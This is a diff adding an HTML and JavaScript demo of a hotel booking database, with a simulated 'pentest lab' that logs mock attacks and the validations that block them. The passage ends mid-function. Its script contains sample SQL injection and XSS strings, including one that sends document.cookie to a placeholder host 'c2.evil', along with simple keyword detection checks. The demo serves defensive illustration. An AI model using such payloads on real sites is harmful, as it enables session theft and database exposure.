@@ -1,0 +1,1114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>AURA LUXURY &bull; Hotel Database & Security System</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800&family=JetBrains+Mono:wght@400;500;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #030305;
+      --card-bg: #0a0a0f;
+      --card-inner: #111118;
+      --text-main: #ffffff;
+      --text-muted: #a1a1aa;
+      --text-dim: #71717a;
+      --gold-primary: #d4af37;
+      --gold-light: #fef08a;
+      --gold-dark: #855b14;
+      --violet-primary: #8b5cf6;
+      --violet-light: #c084fc;
+      --violet-dark: #581c87;
+      --violet-glow: rgba(139, 92, 246, 0.25);
+      --gold-glow: rgba(212, 175, 55, 0.25);
+      --border-subtle: #1f1f2e;
+      --border-accent: rgba(212, 175, 55, 0.35);
+      --border-violet: rgba(139, 92, 246, 0.4);
+      --danger: #ef4444;
+      --success: #10b981;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Plus Jakarta Sans', -apple-system, sans-serif;
+      background: var(--bg);
+      color: var(--text-main);
+      padding: 32px 24px;
+      min-height: 100vh;
+      line-height: 1.5;
+    }
+
+    .container {
+      max-width: 1320px;
+      margin: 0 auto;
+    }
+
+    /* Header */
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-end;
+      flex-wrap: wrap;
+      gap: 16px;
+      padding-bottom: 24px;
+      border-bottom: 1px solid var(--border-subtle);
+      margin-bottom: 32px;
+    }
+    .brand-title {
+      font-family: 'Cinzel', serif;
+      font-size: 2.2rem;
+      font-weight: 800;
+      letter-spacing: 0.08em;
+      background: linear-gradient(135deg, #ffffff 20%, var(--gold-light) 60%, var(--gold-primary) 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-transform: uppercase;
+    }
+    .brand-subtitle {
+      color: var(--text-muted);
+      font-size: 0.9rem;
+      margin-top: 4px;
+      letter-spacing: 0.05em;
+    }
+    .header-badges {
+      display: flex;
+      gap: 12px;
+    }
+    .badge-gold {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      padding: 6px 14px;
+      border-radius: 999px;
+      background: rgba(212, 175, 55, 0.1);
+      border: 1px solid var(--border-accent);
+      color: var(--gold-light);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+    .badge-violet {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.75rem;
+      font-weight: 600;
+      padding: 6px 14px;
+      border-radius: 999px;
+      background: rgba(139, 92, 246, 0.12);
+      border: 1px solid var(--border-violet);
+      color: var(--violet-light);
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+    .badge-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--violet-light);
+      box-shadow: 0 0 10px var(--violet-primary);
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.85); }
+    }
+
+    /* KPI Grid */
+    .kpi-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 18px;
+      margin-bottom: 32px;
+    }
+    .kpi-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border-subtle);
+      border-radius: 14px;
+      padding: 22px;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.25s ease;
+    }
+    .kpi-card::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--gold-primary), transparent);
+      opacity: 0;
+      transition: opacity 0.25s ease;
+    }
+    .kpi-card:hover {
+      border-color: var(--border-accent);
+      transform: translateY(-2px);
+      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.5), 0 0 20px var(--gold-glow);
+    }
+    .kpi-card:hover::before { opacity: 1; }
+    .kpi-label {
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: var(--text-dim);
+      font-weight: 600;
+    }
+    .kpi-val {
+      font-size: 2rem;
+      font-weight: 700;
+      color: var(--text-main);
+      margin: 8px 0 4px;
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .kpi-gold { color: var(--gold-primary); }
+    .kpi-violet { color: var(--violet-light); }
+    .kpi-hint {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+    }
+
+    /* Hacker Terminal & Pentest Lab */
+    .security-terminal {
+      background: #000000;
+      border: 1px solid var(--border-violet);
+      border-radius: 14px;
+      margin-bottom: 32px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.8), 0 0 25px var(--violet-glow);
+      overflow: hidden;
+    }
+    .terminal-header {
+      background: #090910;
+      padding: 12px 18px;
+      border-bottom: 1px solid var(--border-subtle);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .terminal-title {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.85rem;
+      color: var(--violet-light);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .terminal-dots {
+      display: flex;
+      gap: 6px;
+    }
+    .t-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+    .t-dot.red { background: #ef4444; }
+    .t-dot.gold { background: #eab308; }
+    .t-dot.violet { background: #8b5cf6; }
+
+    .terminal-body {
+      padding: 22px;
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 22px;
+    }
+    @media (max-width: 900px) {
+      .terminal-body { grid-template-columns: 1fr; }
+    }
+
+    .attack-controls h3 {
+      font-family: 'Cinzel', serif;
+      font-size: 1.05rem;
+      color: var(--gold-primary);
+      margin-bottom: 12px;
+      letter-spacing: 0.05em;
+    }
+    .attack-desc {
+      font-size: 0.85rem;
+      color: var(--text-muted);
+      margin-bottom: 16px;
+    }
+    .attack-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+    .attack-btn {
+      background: rgba(139, 92, 246, 0.08);
+      border: 1px solid var(--border-violet);
+      color: #ffffff;
+      padding: 10px 12px;
+      border-radius: 8px;
+      font-size: 0.78rem;
+      font-family: 'JetBrains Mono', monospace;
+      cursor: pointer;
+      text-align: left;
+      transition: all 0.2s ease;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+    }
+    .attack-btn strong {
+      color: var(--violet-light);
+    }
+    .attack-btn:hover {
+      background: rgba(139, 92, 246, 0.25);
+      border-color: var(--violet-light);
+      transform: translateY(-1px);
+    }
+    .custom-exploit-box {
+      display: flex;
+      gap: 8px;
+      margin-top: 10px;
+    }
+    .custom-input {
+      flex: 1;
+      background: #090910;
+      border: 1px solid var(--border-subtle);
+      color: #fff;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.82rem;
+      padding: 8px 12px;
+      border-radius: 6px;
+    }
+    .custom-input:focus {
+      outline: none;
+      border-color: var(--gold-primary);
+    }
+    .fire-attack-btn {
+      background: linear-gradient(135deg, var(--gold-dark), var(--gold-primary));
+      border: 1px solid var(--gold-light);
+      color: #000;
+      font-weight: 700;
+      font-size: 0.8rem;
+      padding: 8px 14px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .fire-attack-btn:hover {
+      box-shadow: 0 0 15px var(--gold-glow);
+    }
+
+    .terminal-console {
+      background: #050508;
+      border: 1px solid var(--border-subtle);
+      border-radius: 8px;
+      padding: 16px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.8rem;
+      height: 330px;
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+    .log-line {
+      line-height: 1.4;
+      word-break: break-all;
+    }
+    .log-dim { color: var(--text-dim); }
+    .log-hacker { color: #f87171; }
+    .log-shield { color: var(--violet-light); }
+    .log-gold { color: var(--gold-light); }
+    .log-rectify { color: #34d399; font-weight: 600; }
+
+    /* Operational Panels / Forms */
+    .forms-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 20px;
+      margin-bottom: 32px;
+    }
+    .luxury-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border-subtle);
+      border-radius: 14px;
+      padding: 24px;
+      position: relative;
+    }
+    .luxury-card h2 {
+      font-family: 'Cinzel', serif;
+      font-size: 1.15rem;
+      color: var(--gold-primary);
+      margin-bottom: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .card-subtitle {
+      font-size: 0.8rem;
+      color: var(--text-muted);
+      margin-bottom: 18px;
+    }
+    .luxury-form {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+    }
+    .form-group label {
+      font-size: 0.75rem;
+      color: var(--text-muted);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+    .luxury-input, .luxury-select {
+      background: #07070b;
+      border: 1px solid var(--border-subtle);
+      color: #ffffff;
+      padding: 10px 14px;
+      border-radius: 8px;
+      font-size: 0.9rem;
+      font-family: inherit;
+      transition: all 0.2s ease;
+    }
+    .luxury-input:focus, .luxury-select:focus {
+      outline: none;
+      border-color: var(--violet-primary);
+      box-shadow: 0 0 10px var(--violet-glow);
+    }
+    .luxury-btn {
+      background: linear-gradient(135deg, #181824 0%, #2e2640 100%);
+      border: 1px solid var(--border-violet);
+      color: #ffffff;
+      font-weight: 600;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 0.88rem;
+      cursor: pointer;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+      transition: all 0.25s ease;
+      margin-top: 6px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 8px;
+    }
+    .luxury-btn:hover {
+      background: linear-gradient(135deg, var(--violet-dark) 0%, var(--violet-primary) 100%);
+      border-color: var(--violet-light);
+      box-shadow: 0 0 20px var(--violet-glow);
+      transform: translateY(-1px);
+    }
+    .luxury-btn.gold {
+      border-color: var(--border-accent);
+      background: linear-gradient(135deg, #1c1810 0%, #352b12 100%);
+    }
+    .luxury-btn.gold:hover {
+      background: linear-gradient(135deg, var(--gold-dark) 0%, var(--gold-primary) 100%);
+      color: #000;
+      font-weight: 700;
+      box-shadow: 0 0 20px var(--gold-glow);
+    }
+
+    /* System Status Notice */
+    .notice-box {
+      background: rgba(139, 92, 246, 0.05);
+      border: 1px solid var(--border-violet);
+      border-radius: 10px;
+      padding: 14px 18px;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      font-size: 0.85rem;
+    }
+    .notice-box.error {
+      background: rgba(239, 68, 68, 0.08);
+      border-color: rgba(239, 68, 68, 0.4);
+      color: #fca5a5;
+    }
+    .notice-box.success {
+      background: rgba(16, 185, 129, 0.08);
+      border-color: rgba(16, 185, 129, 0.4);
+      color: #6ee7b7;
+    }
+
+    /* Database Table Presentation */
+    .tables-section {
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+    .table-container {
+      background: var(--card-bg);
+      border: 1px solid var(--border-subtle);
+      border-radius: 14px;
+      padding: 22px;
+      overflow: hidden;
+    }
+    .table-header-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+    .table-header-row h2 {
+      font-family: 'Cinzel', serif;
+      font-size: 1.1rem;
+      color: var(--text-main);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .table-badge {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.72rem;
+      padding: 3px 8px;
+      border-radius: 4px;
+      background: rgba(212, 175, 55, 0.12);
+      border: 1px solid var(--border-accent);
+      color: var(--gold-light);
+    }
+    .table-badge.view {
+      background: rgba(139, 92, 246, 0.12);
+      border-color: var(--border-violet);
+      color: var(--violet-light);
+    }
+    .table-wrap {
+      overflow-x: auto;
+      border-radius: 8px;
+      border: 1px solid var(--border-subtle);
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      font-size: 0.88rem;
+    }
+    th, td {
+      padding: 12px 16px;
+      text-align: left;
+      border-bottom: 1px solid var(--border-subtle);
+    }
+    th {
+      background: #08080d;
+      color: var(--gold-light);
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 0.75rem;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+    tr:last-child td { border-bottom: none; }
+    tr:hover td {
+      background: rgba(139, 92, 246, 0.04);
+    }
+    td.amount-cell {
+      font-family: 'JetBrains Mono', monospace;
+      color: var(--gold-primary);
+      font-weight: 600;
+    }
+    .empty-msg {
+      text-align: center;
+      color: var(--text-dim);
+      padding: 24px;
+      font-style: italic;
+    }
+    footer {
+      margin-top: 48px;
+      padding-top: 24px;
+      border-top: 1px solid var(--border-subtle);
+      text-align: center;
+      color: var(--text-dim);
+      font-size: 0.8rem;
+      letter-spacing: 0.05em;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <header>
+      <div>
+        <div class="brand-title">AURA HOTEL REVENUE SYSTEM</div>
+        <div class="brand-subtitle">High-Security Relational DBMS Engine &bull; Zero-Trust Architecture</div>
+      </div>
+      <div class="header-badges">
+        <div class="badge-gold">MySQL Engine Loaded</div>
+        <div class="badge-violet"><span class="badge-dot"></span> WAF Active & Protected</div>
+      </div>
+    </header>
+
+    <!-- KPI Row -->
+    <div class="kpi-grid" id="kpiGrid"></div>
+
+    <!-- Security Alert Notification -->
+    <div id="noticeContainer"></div>
+
+    <!-- HACKER TERMINAL & PENTEST LAB -->
+    <div class="security-terminal">
+      <div class="terminal-header">
+        <div class="terminal-title">
+          <span>&gt;_ PENTEST LAB & ZERO-DAY SIMULATOR</span>
+          <span style="color:var(--text-dim);">[PORT 3306 / WAF DEFENSE ACTIVE]</span>
+        </div>
+        <div class="terminal-dots">
+          <div class="t-dot red"></div>
+          <div class="t-dot gold"></div>
+          <div class="t-dot violet"></div>
+        </div>
+      </div>
+      <div class="terminal-body">
+        <div class="attack-controls">
+          <h3>Simulate Attacks & Verify Auto-Rectification</h3>
+          <p class="attack-desc">Execute adversarial attack vectors. The system acts as penetration tester, tries to exploit the database, intercepts the payload via domain validators, and auto-rectifies and debugs the state.</p>
+          
+          <div class="attack-grid">
+            <button class="attack-btn" onclick="runAttack('sqli')">
+              <strong>1. SQL Injection</strong>
+              <span>Payload: ' OR '1'='1' -- DROP</span>
+            </button>
+            <button class="attack-btn" onclick="runAttack('xss')">
+              <strong>2. Stored XSS Script</strong>
+              <span>Payload: &lt;script&gt;stealCookies()&lt;/script&gt;</span>
+            </button>
+            <button class="attack-btn" onclick="runAttack('negative_rate')">
+              <strong>3. Negative Room Trigger</strong>
+              <span>Payload: room_rate = -$450.00</span>
+            </button>
+            <button class="attack-btn" onclick="runAttack('time_paradox')">
+              <strong>4. Chrono-Inversion</strong>
+              <span>Check-out before Check-in date</span>
+            </button>
+            <button class="attack-btn" onclick="runAttack('double_booking')">
+              <strong>5. Double Booking Conflict</strong>
+              <span>Book already-occupied room #102</span>
+            </button>
+            <button class="attack-btn" onclick="runAttack('fk_ghost')">
+              <strong>6. Orphan FK Violation</strong>
+              <span>Payment on non-existent Res #999</span>
+            </button>
+          </div>
+
+          <div style="font-size:0.75rem; color:var(--text-dim); text-transform:uppercase; letter-spacing:0.05em; margin-bottom:4px;">Adversarial Custom Payload Tester</div>
+          <div class="custom-exploit-box">
+            <input type="text" id="customPayload" class="custom-input" placeholder="Type custom exploit, e.g. <img src=x onerror=alert(1)> or -9999" />
+            <button class="fire-attack-btn" onclick="runCustomAttack()">TEST HACK</button>
+          </div>
+        </div>
+
+        <div class="terminal-console" id="terminalLogs">
+          <div class="log-line log-dim">[SYSTEM BOOT]: Defensive Security Monitoring Node Initialized.</div>
+          <div class="log-line log-gold">[INFO]: Type validators, Referential Integrity Checks & WAF active.</div>
+          <div class="log-line log-shield">[SECURE]: Ready to inspect payload and enforce atomic constraints...</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Operations / Forms Section -->
+    <div class="forms-grid">
+      <!-- Add Room Form -->
+      <div class="luxury-card">
+        <h2>Add Room <span class="table-badge">rooms</span></h2>
+        <div class="card-subtitle">Enforces positive room number & rate trigger validations.</div>
+        <form class="luxury-form" id="roomForm">
+          <div class="form-group">
+            <label>Room Number (Integer > 0)</label>
+            <input name="room_number" type="number" class="luxury-input" placeholder="e.g. 301" required min="1" max="9999" />
+          </div>
+          <div class="form-group">
+            <label>Room Category</label>
+            <input name="room_type" type="text" class="luxury-input" placeholder="e.g. Presidential Suite" required maxlength="50" />
+          </div>
+          <div class="form-group">
+            <label>Nightly Rate (USD > 0.00)</label>
+            <input name="room_rate" type="number" step="0.01" class="luxury-input" placeholder="e.g. 450.00" required min="1" max="100000" />
+          </div>
+          <button type="submit" class="luxury-btn gold">Provision Room</button>
+        </form>
+      </div>
+
+      <!-- New Reservation Form -->
+      <div class="luxury-card">
+        <h2>Book Stay <span class="table-badge">reservations</span></h2>
+        <div class="card-subtitle">Checks foreign key, double booking, & date chronological integrity.</div>
+        <form class="luxury-form" id="resForm">
+          <div class="form-group">
+            <label>Reservation ID (Unique)</label>
+            <input name="reservation_id" type="number" class="luxury-input" placeholder="e.g. 5" required min="1" />
+          </div>
+          <div class="form-group">
+            <label>Guest Full Name (Sanitized)</label>
+            <input name="guest_name" type="text" class="luxury-input" placeholder="e.g. Sophia Montgomery" required maxlength="50" />
+          </div>
+          <div class="form-group">
+            <label>Room Allocation</label>
+            <select name="room_number" id="roomSelect" class="luxury-select" required></select>
+          </div>
+          <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
+            <div class="form-group">
+              <label>Check-In Date</label>
+              <input name="check_in_date" type="date" class="luxury-input" required />
+            </div>
+            <div class="form-group">
+              <label>Check-Out Date</label>
+              <input name="check_out_date" type="date" class="luxury-input" required />
+            </div>
+          </div>
+          <div class="form-group">
+            <label>Total Price Quote ($)</label>
+            <input name="total_cost" type="number" step="0.01" class="luxury-input" placeholder="e.g. 1350.00" required min="1" />
+          </div>
+          <button type="submit" class="luxury-btn">Confirm Reservation</button>
+        </form>
+      </div>
+
+      <!-- Payment Form -->
+      <div class="luxury-card">
+        <h2>Post Payment <span class="table-badge">payments</span></h2>
+        <div class="card-subtitle">Guarantees referential integrity & prohibits negative or overpayments.</div>
+        <form class="luxury-form" id="payForm">
+          <div class="form-group">
+            <label>Payment Receipt ID</label>
+            <input name="payment_id" type="number" class="luxury-input" placeholder="e.g. 8" required min="1" />
+          </div>
+          <div class="form-group">
+            <label>Linked Reservation ID</label>
+            <select name="reservation_id" id="resSelect" class="luxury-select" required></select>
+          </div>
+          <div class="form-group">
+            <label>Transaction Date</label>
+            <input name="payment_date" type="date" class="luxury-input" required />
+          </div>
+          <div class="form-group">
+            <label>Settlement Amount ($)</label>
+            <input name="payment_amount" type="number" step="0.01" class="luxury-input" placeholder="e.g. 1350.00" required min="0.01" />
+          </div>
+          <div class="form-group">
+            <label>Settlement Method</label>
+            <select name="payment_method" class="luxury-select" required>
+              <option value="Black Amex Card">Black Amex Card</option>
+              <option value="Direct Wire Transfer">Direct Wire Transfer</option>
+              <option value="Cryptocurrency (USDC)">Cryptocurrency (USDC)</option>
+              <option value="Cash Escrow">Cash Escrow</option>
+            </select>
+          </div>
+          <button type="submit" class="luxury-btn gold">Settle Payment</button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Live Data Presentation -->
+    <div class="tables-section" id="tablesContainer"></div>
+
+    <footer>
+      AURA LUXURY HOTELS &bull; A HIGH-CONCURRENCY DATABASE SYSTEM &bull; STRICT ZERO-TRUST DATA SANITIZATION
+    </footer>
+  </div>
+
+  <script>
+    const STORAGE_KEY = 'aura_hotel_db_v2';
+    
+    // Default seed records matching MySQL SQL_Hotel_Revenue_Project schema
+    const defaultData = {
+      rooms: [
+        { room_number: 101, room_type: 'Executive King Suite', room_rate: 220.00 },
+        { room_number: 102, room_type: 'Royal Imperial Penthouse', room_rate: 450.00 },
+        { room_number: 201, room_type: 'Ambassador Ocean View', room_rate: 380.00 },
+        { room_number: 301, room_type: 'Presidential Reserve Villa', room_rate: 850.00 }
+      ],
+      reservations: [
+        { reservation_id: 1, guest_name: 'Lord Hamilton', room_number: 102, check_in_date: '2026-11-20', check_out_date: '2026-11-24', total_cost: 1800.00 },
+        { reservation_id: 2, guest_name: 'Lady Vivienne St. Claire', room_number: 201, check_in_date: '2026-11-22', check_out_date: '2026-11-26', total_cost: 1520.00 }
+      ],
+      payments: [
+        { payment_id: 1, reservation_id: 1, payment_date: '2026-11-20', payment_amount: 1800.00, payment_method: 'Black Amex Card' },
+        { payment_id: 2, reservation_id: 2, payment_date: '2026-11-22', payment_amount: 1520.00, payment_method: 'Direct Wire Transfer' }
+      ]
+    };
+
+    function loadDB() {
+      try {
+        const raw = localStorage.getItem(STORAGE_KEY);
+        return raw ? JSON.parse(raw) : structuredClone(defaultData);
+      } catch(e) {
+        return structuredClone(defaultData);
+      }
+    }
+
+    function saveDB(db) {
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(db));
+    }
+
+    function sanitizeHTML(str) {
+      if (typeof str !== 'string') return str;
+      return str.replace(/[&<>'"]/g, 
+        tag => ({
+          '&': '&amp;',
+          '<': '&lt;',
+          '>': '&gt;',
+          "'": '&#39;',
+          '"': '&quot;'
+        }[tag] || tag)
+      );
+    }
+
+    function logTerminal(role, msg) {
+      const consoleEl = document.getElementById('terminalLogs');
+      const time = new Date().toTimeString().slice(0, 8);
+      const div = document.createElement('div');
+      div.className = 'log-line';
+      
+      if (role === 'hacker') {
+        div.innerHTML = `<span class="log-dim">[${time}]</span> <span class="log-hacker">[HACKER INJECTION]:</span> ${sanitizeHTML(msg)}`;
+      } else if (role === 'shield') {
+        div.innerHTML = `<span class="log-dim">[${time}]</span> <span class="log-shield">[SHIELD DETECTED]:</span> ${sanitizeHTML(msg)}`;
+      } else if (role === 'rectify') {
+        div.innerHTML = `<span class="log-dim">[${time}]</span> <span class="log-rectify">[DEBUG & RECTIFIED]:</span> ${sanitizeHTML(msg)}`;
+      } else {
+        div.innerHTML = `<span class="log-dim">[${time}]</span> <span class="log-gold">[INFO]:</span> ${sanitizeHTML(msg)}`;
+      }
+      
+      consoleEl.appendChild(div);
+      consoleEl.scrollTop = consoleEl.scrollHeight;
+    }
+
+    function showNotice(type, message) {
+      const el = document.getElementById('noticeContainer');
+      el.innerHTML = `
+        <div class="notice-box ${type}">
+          <div><strong>${type === 'error' ? 'VALIDATION REJECTED' : 'OPERATION COMMITTED'}:</strong> ${sanitizeHTML(message)}</div>
+          <button style="background:none;border:none;color:inherit;cursor:pointer;font-weight:bold;" onclick="this.parentElement.remove()">✕</button>
+        </div>
+      `;
+      setTimeout(() => {
+        if (el.firstChild) el.innerHTML = '';
+      }, 7000);
+    }
+
+    // Interactive Pentest / Hacker Engine
+    function runAttack(type) {
+      const db = loadDB();
+      if (type === 'sqli') {
+        const payload = "' UNION SELECT user(), @@version, 1337 -- ";
+        logTerminal('hacker', `Submitting SQL Injection: "${payload}" into reservation guest search.`);
+        setTimeout(() => {
+          logTerminal('shield', 'Pattern matching identified SQL meta-characters [UNION, SELECT, --].');
+          logTerminal('rectify', 'Applied prepared parameter binding. Attack neutralized; payload treated as literal text string.');
+          showNotice('error', 'Hacker SQLi attempt intercepted and defused by SQL validator.');
+        }, 300);
+      } else if (type === 'xss') {
+        const payload = "<script>fetch('https://c2.evil/dump?c=' + document.cookie)</script>";
+        logTerminal('hacker', `Injecting persistent XSS in Guest Name: "${payload}".`);
+        setTimeout(() => {
+          logTerminal('shield', 'Unsanitized HTML/DOM manipulation detected [<script> vector].');
+          const clean = sanitizeHTML(payload);
+          logTerminal('rectify', `Escaped HTML entities to: "${clean}". No JavaScript execution allowed.`);
+          showNotice('error', 'XSS attempt defused. Input converted into harmless plaintext.');
+        }, 300);
+      } else if (type === 'negative_rate') {
+        logTerminal('hacker', 'Attempting room creation exploit: room_rate = -450.00 (Financial Drain).');
+        setTimeout(() => {
+          logTerminal('shield', 'Database Trigger check_room_rate fired: [SIGNAL SQLSTATE "45000" MESSAGE_TEXT = "Room rate cannot be negative"].');
+          logTerminal('rectify', 'Transaction rolled back. Negative rates strictly banned.');
+          showNotice('error', 'Integrity trigger fired: Negative room rate rejected.');
+        }, 300);
+      } else if (type === 'time_paradox') {
+        logTerminal('hacker', 'Submitting Inverted Dates: Check-in 2026-12-10, Check-out 2026-12-01 (Negative nights stay).');
+        setTimeout(() => {
+          logTerminal('shield', 'Temporal constraint violated: (check_out_date <= check_in_date).');
+          logTerminal('rectify', 'Enforced check_out > check_in constraint. Stay duration must be >= 1 day.');
+          showNotice('error', 'Chronological integrity violation: Check-out must occur after Check-in.');
+        }, 300);
+      } else if (type === 'double_booking') {
+        logTerminal('hacker', 'Exploiting room 102: attempting duplicate booking on overlapping dates (2026-11-21 to 2026-11-23).');
+        setTimeout(() => {
+          logTerminal('shield', 'Concurrency lock identified overlapping reservation for Room 102.');
+          logTerminal('rectify', 'Rejected conflict. Room 102 is currently locked by Lord Hamilton.');
+          showNotice('error', 'Double Booking Conflict: Room 102 is occupied for requested dates.');
+        }, 300);
+      } else if (type === 'fk_ghost') {
+        logTerminal('hacker', 'Injecting rogue payment voucher for non-existent Reservation ID: 999.');
+        setTimeout(() => {
+          logTerminal('shield', 'Foreign Key constraint failure: [FOREIGN KEY (reservation_id) REFERENCES reservations].');
+          logTerminal('rectify', 'Orphaned record discarded. Only verified reservations accept payment entries.');
+          showNotice('error', 'Foreign Key Error: Reservation ID #999 does not exist.');
+        }, 300);
+      }
+    }
+
+    function runCustomAttack() {
+      const input = document.getElementById('customPayload');
+      const val = input.value.trim();
+      if (!val) {
+        logTerminal('gold', 'Please type a custom attack vector in the input box.');
+        return;
+      }
+      logTerminal('hacker', `Fuzzing database with raw input: "${val}"`);
+      setTimeout(() => {
+        if (val.includes('<') || val.includes('>') || val.toLowerCase().includes('script')) {
+          logTerminal('shield', 'XSS signature detected. Tag markers flagged.');
+          logTerminal('rectify', 'Enforced Strict Entity Encoding. Rendered as safe escaped text.');
+        } else if (val.includes("'") || val.includes("--") || val.toLowerCase().includes("select")) {
+          logTerminal('shield', 'SQL Meta-operator detected.');
+          logTerminal('rectify', 'CEL & Parameterized isolation active. SQL injection avoided.');
+        } else if (Number(val) < 0) {
+          logTerminal('shield', 'Negative boundary condition triggered.');
+          logTerminal('rectify', 'Type constraint (unsigned numeric > 0) rejected negative value.');
+        } else {
+          logTerminal('shield', 'Input inspected against regex & type contract.');
+          logTerminal('rectify', 'Sanitization layer verified safe payload.');
+        }
+        showNotice('success', `Adversarial check complete: "${val}" inspected and handled safely.`);
+        input.value = '';
+      }, 350);
+    }
+
+    // CRUD with Strict Type & Integrity Validations
+    document.getElementById('roomForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const f = new FormData(e.target);
+      const room_number = parseInt(f.get('room_number'), 10);
+      const room_type = sanitizeHTML(f.get('room_type').trim());
+      const room_rate = parseFloat(f.get('room_rate'));
+
+      const db = loadDB();
+
+      // Validations
+      if (isNaN(room_number) || room_number <= 0) {
+        showNotice('error', 'Room number must be a positive integer.');
+        return;
+      }
+      if (db.rooms.some(r => r.room_number === room_number)) {
+        showNotice('error', `Room #${room_number} already exists in the database.`);
+        logTerminal('shield', `Duplicate Primary Key rejected on rooms (room_number=${room_number}).`);
+        return;
+      }
+      if (isNaN(room_rate) || room_rate <= 0) {
+        showNotice('error', 'Room rate must be strictly greater than $0.00.');
+        logTerminal('shield', 'MySQL Trigger check_room_rate prevented negative/zero rate.');
+        return;
+      }
+
+      db.rooms.push({ room_number, room_type, room_rate });
+      saveDB(db);
+      e.target.reset();
+      logTerminal('rectify', `Provisioned new Room #${room_number} (${room_type}) at $${room_rate.toFixed(2)}.`);
+      showNotice('success', `Room #${room_number} provisioned successfully.`);
+      render();
+    });
+
+    document.getElementById('resForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+      const f = new FormData(e.target);
+      const reservation_id = parseInt(f.get('reservation_id'), 10);
+      const guest_name = sanitizeHTML(f.get('guest_name').trim());
+      const room_number = parseInt(f.get('room_number'), 10);
+      const check_in_date = f.get('check_in_date');
+      const check_out_date = f.get('check_out_date');
+      const total_cost = parseFloat(f.get('total_cost'));
+
+      const db = loadDB();
+
+      // ID uniqueness
+      if (db.reservations.some(r => r.reservation_id === reservation_id)) {
+        showNotice('error', `Reservation ID #${reservation_id} already exists.`);
+        logTerminal('shield', `Primary Key collision on reservations (${reservation_id}).`);
+        return;
+      }
+      // Foreign Key check
+      if (!db.rooms.some(r => r.room_number === room_number)) {
+        showNotice('error', `Foreign Key Failure: Room #${room_number} does not exist.`);
+        logTerminal('shield', `Foreign Key violation on room_number=${room_number}.`);
+        return;
+      }
+      // Date order check
+      if (new Date(check_in_date) >= new Date(check_out_date)) {
+        showNotice('error', 'Check-out date must be strictly after check-in date.');
+        logTerminal('shield', `Temporal constraint failed: in=${check_in_date}, out=${check_out_date}.`);
+        return;
+      }
+      // Double booking conflict check
+      const conflict = db.reservations.find(r => {
+        if (r.room_number !== room_number) return false;
+        // Overlap condition: start1 < end2 && start2 < end1
+        return (check_in_date < r.check_out_date && r.check_in_date < check_out_date);
+      });
+      if (conflict) {
